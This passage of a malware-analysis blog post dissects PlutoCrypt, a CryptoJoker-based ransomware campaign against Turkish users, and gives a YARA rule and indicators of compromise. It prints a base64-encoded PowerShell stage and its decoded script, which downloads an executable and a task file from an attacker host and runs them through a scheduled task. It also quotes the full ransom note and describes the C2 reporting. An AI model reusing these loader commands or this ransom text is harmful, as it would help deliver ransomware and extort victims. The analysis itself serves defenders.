ENCODED_POWERSHELL5 = 'YwBkACAAJABlAG4AdgA6AGEAcABwAGQAYQB0AGEACgBTAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAkAGUAbgB2ADoAYQBwAHAAZABhAHQAYQAvAGgAbwBsAG8ALgB0AHgAdAAgACcAYgBlAG4AaQAgAGIAdQByAGEAZABhACAAYgAxAXIAYQBrACcACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwADoALwAvAGgAbwBzAHQAZABvAG4AZQAuAGQAZABuAHMALgBuAGUAdAAvAHAAbAAuAGUAeABlACcAIAAtAE8AdQB0AEYAaQBsAGUAIABwAGwALgBlAHgAZQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AaABvAHMAdABkAG8AbgBlAC4AZABkAG4AcwAuAG4AZQB0AC8AZQAnACAALQBPAHUAdABGAGkAbABlACAAZQBuAGMALgB4AG0AbAAKAGMAZAAgACQAZQBuAHYAOgBhAHAAcABkAGEAdABhAAoAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBlAG4AYwAiACAALwBYAE0ATAAgACIAZQBuAGMALgB4AG0AbAAiAAoAYwBtAGQAIAAvAGMAIABzAGMAaAB0AGEAcwBrAHMAIAAgAC8AUgBVAE4AIAAvAFQATgAgACIAZQBuAGMAIgA='

print(base64.b64decode(ENCODED_POWERSHELL5).replace(b'\x00',b'').decode())
```

    cd $env:appdata
    Set-Content $env:appdata/holo.txt 'beni burada b1rak'
    Invoke-WebRequest -Uri 'http://hostdone.ddns.net/pl.exe' -OutFile pl.exe
    Invoke-WebRequest -Uri 'http://hostdone.ddns.net/e' -OutFile enc.xml
    cd $env:appdata
    SCHTASKS /Create /TN "enc" /XML "enc.xml"
    cmd /c schtasks  /RUN /TN "enc"


This final script has several things it does:
1. Creates a junk file `holo.txt` with the text `beni burada b1 rak` (translated to: **leave me here** [Mr. Robot Reference?])
2. Downloads 2 files from the remote server: `pl.exe` and `enc.xml`
3. Creates a task with the name of `enc` alongside with the content of `enc.xml` and then executes it.

## enc.xml
Once again, let's check the content of the downloaded xml file:
```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2021-05-20T06:39:04</Date>
    <Author></Author>
    <URI>\enc</URI>
  </RegistrationInfo>
  <Triggers />
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%appdata%\pl.exe</Command>
    </Exec>
  </Actions>
</Task>
```

The task has a single command that it will execute and it's to simply run the freshly retrieved payload `pl.exe` which will be the actual ransomware payload.

# PlutoCrypt Analysis
## Static Information
PlutoCrypt is 32Bit .NET ransomware, as we can see by DiE analyze:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/10.png)

Opening the binary in DnSpy, an incriminating evidence pops up exposing that our ransomware is based on the CryptoJoker ransomware (which is actually an open source malware that can be found [here](https://github.com/jaenudin86/CryptoJoker)):

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/11.png)

## Code Comparison 
First, we will have a look at the main fuction:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/12.png)

Well it's very much identical, you can see also that our PlutoCrypt ransomware has a method called `JokerIsNotRunning` which is also presented in the same place at the original code.<br>
PlutoCrypt expands the infection method that was initally written in CryptoJoker as can be seen here:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/13.png)

CryptoJoker was supposed to only encrypt the `%USERPROFILE%` related path but PlutoCrypt expands the infection to some additional possible drivers that might be installed on the victim's computer.

## Ransom Note
```
	Bu Bilgisayarın Güvenliği Ihlal Edilmiştir !!

PlutoCrypt bu bilgisayardaki tüm verileri askeri düzeyde RSA-4096 ile şifrelenmiştir.
Verilerinizi geri kurtarabilmek için bize 72 saat içinde 10.000 TL ödemenizi rica etmekteyiz.
Eğer ilk 24 saat içerisinde ödeme yapılırsa %40 indirimle 6.000 TL talep etmekteyiz.

Yaptığımız işi ciddiye alıyoruz verilerin hassas veya önemli olabileceğini biliyoruz.
Ödemenizi 72 saat içinde yapmadığınız taktirde; verilerinizi kurtarabileceğiniz anahtar kalıcı olarak silinecektir aynı zamanda bilgisayardaki tüm veriler internette herkeze açık paylaşılacaktır.

Ödeme yapılmazsa paylaşılacak verileriniz; 
1) Bilgisayarda şifrelenen tüm dosyalarınız (fotoğraf, belgeleriniz vs.) 
2) Tarayıcınızdan girdiğiniz "Whatsapp Web", "outlook", "gmail" ve bilgisayarınızda yüklü uygulamalara ait tüm mailleşme/mesajlaşmalarınızın birer kopyası da offline olarak paylaşılacaktır.

Bitcoin ile ödeme yapmanız ve şifre çözücü anahtarı almanız kredi/banka kartı sahibiyseniz 1 saat sürmektedir.
Işlemleriniz için sifre@pluton.pw mail adresine vakit kaybetmeden ulaşınız. 
(NOT: Eğer 2 saat içerisinde geri dönüş alamadıysanız spam kutusuna bakınız.) 
Kişisel id'niz: [HWID goes here]
```
**Translation:**
```
This Computer Has Been Breached !!

PlutoCrypt all data on this computer is encrypted with military grade RSA-4096.
In order to recover your data, we ask you to pay us 10,000 TL within 72 hours.
If payment is made within the first 24 hours, we request 6,000 TL with a 40% discount.

We take what we do seriously and we know that data can be sensitive or important.
If you do not make your payment within 72 hours; The key with which you can recover your data will be permanently deleted, and at the same time, all data on the computer will be shared publicly on the internet.

Your data to be shared if payment is not made;
1) All your encrypted files (photos, documents, etc.)
2) A copy of each of your "Whatsapp Web", "outlook", "gmail" and applications installed on your computer will be shared offline.

If you are a credit/debit card holder, it takes 1 hour to pay with Bitcoin and receive the decryption key.
For your transactions, please contact sifre@pluton.pw without delay.
(NOTE: If you haven't received a response within 2 hours, check your spam box.)
Your personal id: [HWID goes here]
```

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/14.png)

## New Victim Notification
Once a machine was infected and the ransomnote was crafted and displayed the the victim, a `POST` request will occur to the TA server (199.192.20[.]58:3001) with the unique `UID` of the machine and a base64 encoded string that contains the RSA Keys:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/15.png)

This part was modified by the authors of PlutoCrypt because in the original code of CryptoJoker the alert for new victim sends and email rather then a `POST` request:

![image.png](/assets/images/PlutoCrypt-CryptoJoker-Varient/16.png)

# Yara Rule
```vb
rule Win_CryptoJoker_Variants {
    meta:
        author = "0xToxin"
        description = "PlutoCrypt/CryptoJoker Strings"
    strings:
		$n1 = "CryptoJoker" ascii
		$n2 = "PlutoCrypt" nocase
		$s1 = "CryptJokerWalker90912" ascii wide
		$s2 = "SendEmail" ascii
		$s3 = ".partially." ascii wide
		$s4 = ".fully." ascii wide
		$s5 = "Do not delete this file, else the decryption process will be broken" ascii wide
		$s6 = "And the decryption key is:" ascii wide
		$s7 = "The HWID is:" ascii wide
    condition:
        uint16(0) == 0x5a4d and 1 of ($n*) and all of ($s*)
}
```

# VT Graph
<iframe
  src="https://www.virustotal.com/graph/embed/g76c7f000e1be4e84a89863653dbceac10da6b77922d14da8b1c8b27035d0f49f?theme=dark"
  width="700"
  height="400">
</iframe>      

# Summary 
In this blog post we went over a recent phishing campaign that was targeting the Turkish audience with a variant of the CryptoJoker ransomware. Through the blog we learned about the execution flow that the TA used, by abusing task scheduling and some other execution/evading techniques such as duplicating System32 folder & DLL sideloading. <br>
Hopefully you enjoyed reading through and learned a few new things!

# IOCs
- Urls:
    - http://hostdone.ddns[.]net/x1.xml
    - http://hostdone.ddns[.]net/task.xml
    - http://hostdone.ddns[.]net/t.pd
    - http://hostdone.ddns[.]net/u.dl
    - http://hostdone.ddns[.]net/pl.exe
    - http://hostdone.ddns[.]net/e
- Files:
    - vakifbank iot-10-04-2023logs.rar - [9026c67b52f9ddece9a7e203978e8aa9ffa5a128cf83a238c924dce141899aec](https://bazaar.abuse.ch/sample/9026c67b52f9ddece9a7e203978e8aa9ffa5a128cf83a238c924dce141899aec/)
    - vakifbank iot-10-04-2023logs.hta - [b05328077aa1dd5dba4d8e25cb028dc4f533bd1dd69bc6d12ec2f8298598f803](https://bazaar.abuse.ch/sample/b05328077aa1dd5dba4d8e25cb028dc4f533bd1dd69bc6d12ec2f8298598f803/)
    - task.xml - [6cbed31fdf5554ead21de9ccdd12ccc6d9f0b4eaf5f874ce96103ab01f522073](https://bazaar.abuse.ch/sample/6cbed31fdf5554ead21de9ccdd12ccc6d9f0b4eaf5f874ce96103ab01f522073/)
    - uxtheme.dll - [8279282e07e2fa82cad4f0cb0b450e77dab930a7db7c9488f663002753d79dde](https://bazaar.abuse.ch/sample/8279282e07e2fa82cad4f0cb0b450e77dab930a7db7c9488f663002753d79dde/)
    - x.xml - [df38a5d9d7d6c9cfea65eb562317f71bea94a0fc731e1fe9121f9479e56f61fd](https://bazaar.abuse.ch/sample/df38a5d9d7d6c9cfea65eb562317f71bea94a0fc731e1fe9121f9479e56f61fd/)
    - enc.xml - [20cf29f926a18b44f580137ddb65d81bc0ed419412910a7682ee7b95b186ac82](https://bazaar.abuse.ch/sample/20cf29f926a18b44f580137ddb65d81bc0ed419412910a7682ee7b95b186ac82/)
    - pl.exe - [e8527f309846d18fbf85289283dcde7b19063a50b11263ba0d36663df8fcfd30](https://bazaar.abuse.ch/sample/e8527f309846d18fbf85289283dcde7b19063a50b11263ba0d36663df8fcfd30/)
- Domains:
    - hostdone.ddns[.]net
    - deni[.]tk
- IPs:
    - 199.192.20[.]58

# References
- [CryptoJoker Git Repo](https://github.com/jaenudin86/CryptoJoker)
- [CryptoJoker Twitter Results](https://twitter.com/search?q=cryptojoker%20ransomware&src=recent_search_click)
- [Shodan Query](https://www.shodan.io/host/199.192.20.58)
- [NocryCrypt0r relation based on BTC wallet](https://www.pcrisk.com/removal-guides/19426-nocrycrypt0r-ransomware)
